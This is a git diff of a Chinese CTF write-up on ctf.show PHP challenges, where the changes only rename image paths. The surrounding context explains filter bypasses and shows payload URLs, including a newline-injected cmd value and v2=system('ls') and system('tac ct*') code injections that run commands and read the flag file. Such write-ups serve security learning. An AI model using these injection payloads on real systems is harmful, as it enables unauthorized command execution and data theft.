@@ -33,7 +33,7 @@ if(isset($_GET['num'])){
 } 
 ```
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 代码逻辑很简单，就是我们要让匹配$num的结果是0，然后$num变量通过intval为1就可以了。对于preg\_match匹配要是0，就说明不能是数字，但是如果是字符串的话，在下面的intval匹配中就会为0，这个时候我们要想到如果$num传入一个数组，那么对于pre\_match的特性，就会输出false然后我们就会进入else语句然后num是个数组并且不为空的话，就会输出1，也就是我们的num要通过url解析成一个不为空的数组。
 
@@ -162,7 +162,7 @@ nonononono
 http://4e1772d9-0414-4f78-a71b-8b49260e5e5e.challenge.ctf.show/?cmd=%0aphp
 ```
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -195,7 +195,7 @@ if(isset($_GET['num'])){
     } 
 ```
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:green;">①代码解释</mark>
 
@@ -538,7 +538,7 @@ highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
 
 ```
 
-<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## <mark style="color:green;">①代码解释</mark>
 
@@ -615,7 +615,7 @@ if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
 ?> 
 ```
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:green;">①代码解释</mark>
 
@@ -711,7 +711,7 @@ Notice: Undefined index: v2 in /var/www/html/index.php on line 18
 Notice: Undefined index: v3 in /var/www/html/index.php on line 19
 ```
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:green;">①代码解释</mark>
 
@@ -725,7 +725,7 @@ Notice: Undefined index: v3 in /var/www/html/index.php on line 19
 http://4eb5f1fe-a9fd-4f35-ab83-1e6102816cd2.challenge.ctf.show/?v1=1&v2=system("ls")&v3=;
 ```
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```url
 http://4eb5f1fe-a9fd-4f35-ab83-1e6102816cd2.challenge.ctf.show/?v1=1&v2=system("tac ct*")&v3=;
